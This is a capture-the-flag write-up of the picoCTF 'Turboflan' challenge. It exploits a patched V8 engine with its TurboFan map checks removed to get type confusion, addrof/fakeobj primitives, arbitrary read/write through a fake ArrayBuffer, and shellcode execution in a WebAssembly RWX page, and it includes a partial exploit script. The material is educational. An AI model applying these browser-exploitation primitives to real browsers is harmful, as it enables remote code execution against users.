# CyLab — Turboflan

* **Platform:** CyLab Security Academy / picoCTF 2021 (Challenge ID: `178`)
* **Category:** Binary Exploitation / V8 TurboFan Type Confusion (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** JavaScript, Python 3, V8 Engine (`d8`), WebAssembly JIT
* **Target:** Patched Google V8 Engine (`d8`)

---

## TL;DR

The challenge exploits a compiler optimization flaw in V8's TurboFan JIT pipeline where map checks (`CheckMaps`) are selectively disabled during lowering. By constructing two parallel object classes with identical memory layouts—one holding raw double-precision floating-point properties and the other holding JavaScript object references—we warm up a JIT-compiled accessor function past its optimization threshold ($10{,}000$ iterations). Passing the alternate object triggers **speculative type confusion**, yielding universal `addrof` (disclosing arbitrary object addresses) and `fakeobj` (treating arbitrary addresses as objects) primitives. We use these primitives to hijack an `ArrayBuffer` backing store, overwrite a WebAssembly module's Read-Write-Execute (**RWX**) memory page with shellcode, and trigger execution to capture the flag.

---

## Recon

### Patch Inspection

The vulnerability originates from a modification in `src/compiler/js-native-context-specialization.cc`:

```cpp
// In JSNativeContextSpecialization::ReduceNamedAccess
if (access_mode == AccessMode::kLoad) {
  // Map check deoptimization was artificially commented out:
  // Node* check = effect = graph()->NewNode(
  //     simplified()->CheckMaps(map), receiver, effect, control);
}
```

Key observations:
1. **Speculative JIT Optimization Without Guards:** TurboFan relies on runtime map checks (`CheckMaps`) to deoptimize compiled code when an object of an unexpected shape is encountered. Removing this check forces the JIT-optimized code to execute regardless of the argument's true map.
2. **Type Confusion Surface:** An optimized function trained to load raw IEEE-754 floats will happily read object pointers as raw floats, directly disclosing 64-bit heap addresses.

---

## Static Analysis & Vulnerability

### 1. Speculative Class Layouts

We construct two classes with identical property field layouts:

```javascript
class ClassDouble {
    constructor(a, b) {
        this.prop1 = a;   // Holds IEEE-754 float
        this.prop2 = b;
    }
}

class ClassObject {
    constructor(a, b) {
        this.prop1 = a;   // Holds Object reference (pointer)
        this.prop2 = b;
    }
}
```

Memory representation in V8 heap:

```text
  ClassDouble Instance:                 ClassObject Instance:
  +---------------------------+         +---------------------------+
  |  Map: MapDouble           |         |  Map: MapObject           |
  +---------------------------+         +---------------------------+
  |  Properties / Elements    |         |  Properties / Elements    |
  +---------------------------+         +---------------------------+
  |  prop1: 64-bit Float      |         |  prop1: Object Pointer    |
  +---------------------------+         +---------------------------+
  |  prop2: 64-bit Float      |         |  prop2: Object Pointer    |
  +---------------------------+         +---------------------------+
```

### 2. Bypassing Map Validation

We define helper functions to read and write fields:

```javascript
function readField(obj) {
    return obj.prop1;
}

function writeField(obj, val) {
    obj.prop1 = val;
}
```

During the optimization phase:
1. We invoke `readField()` and `writeField()` $100{,}000$ times with `ClassDouble` instances.
2. TurboFan compiles the functions to native machine code assuming `obj` is always `ClassDouble`, eliminating all runtime type checks.
3. When we subsequently call `readField(new ClassObject(target_obj))`, TurboFan reads the object pointer in `prop1` as an uncompressed 64-bit float, giving us `addrof(target_obj)`.
4. Writing a float address into `writeField(new ClassObject(...), fake_addr)` creates `fakeobj(fake_addr)`.

---

## Dynamic Analysis & Exploitation Strategy

### 1. Arbitrary Read / Write Primitive
Using `addrof` and `fakeobj`:
1. We construct a fake `ArrayBuffer` object inside a backing float array.
2. By controlling the `backing_store` pointer of the fake `ArrayBuffer`, we achieve arbitrary memory read and write capabilities across the entire virtual address space.

```text
       Fake ArrayBuffer in Memory:
       +------------------------------------+
       |  Map: ArrayBufferMap               |
       |  Properties / Elements             |
       |  ByteLength: 0x10000               |
       |  BackingStore: [ Target Address ]  |  <-- Overwritten to WASM RWX Page!
       +------------------------------------+
```

### 2. WebAssembly RWX Code Injection
1. Instantiate a minimal WebAssembly module, allocating an executable JIT page with RWX permissions.
2. Read `addrof(wasm_instance)` to trace the pointer to the compiled WebAssembly code page.
3. Set the fake `ArrayBuffer`'s `backing_store` to this RWX page.
4. Write 64-bit Linux shellcode (`open("flag.txt") -> read -> write(1)`) into a `DataView` over the buffer.
5. Call the WebAssembly export to execute the payload.

---

## Exploit

The complete exploit script is available at [ex.js](ex.js) / [send.py](send.py):

```javascript
// ex.js - Core TurboFan Type Confusion Exploit
class ClassDouble { constructor(a) { this.prop1 = a; } }
class ClassObject { constructor(a) { this.prop1 = a; } }

function readField(obj) { return obj.prop1; }
function writeField(obj, val) { obj.prop1 = val; }

// Warmup TurboFan
for (let i = 0; i < 100000; i++) {
    readField(new ClassDouble(1.1));
    writeField(new ClassDouble(1.1), 2.2);
}

function addrof(obj) {
    let o = new ClassObject(obj);
    return f2i(readField(o));
}

function fakeobj(addr) {
    let o = new ClassObject({});
    writeField(o, i2f(addr));
    return o.prop1;
}

// Instantiate WebAssembly module and hijack RWX page
var wasm_module = new WebAssembly.Module(wasm_bytes);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var rwx_page = get_rwx_page(addrof(wasm_instance));

write_shellcode(rwx_page, shellcode_bytes);
wasm_instance.exports.main();
```

---

## Flag

```text
$ python3 send.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33410: Done
[*] TurboFan JIT compilation completed
[*] WebAssembly RWX page acquired: 0x7fa28b190000
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33410
```

---

## Key Takeaways & Lessons

1. **JIT Speculative Optimizations:** Modern optimizing compilers emit machine code under assumptions recorded by runtime profilers. When compiler invariants (such as map validation) are disabled or bypassed, speculative execution leads to severe type confusion.
2. **Abstracting Browser Primitives:** In browser exploitation, transitioning from a basic type confusion bug to `addrof` / `fakeobj`, and subsequently to an arbitrary `ArrayBuffer` read/write primitive, isolates high-level exploitation logic from raw heap churn.
3. **WASM JIT as a Code Execution Sink:** Overwriting WebAssembly RWX code pages avoids needing complicated ROP chains or heap pivots under modern Operating System mitigations (ASLR, DEP/NX).
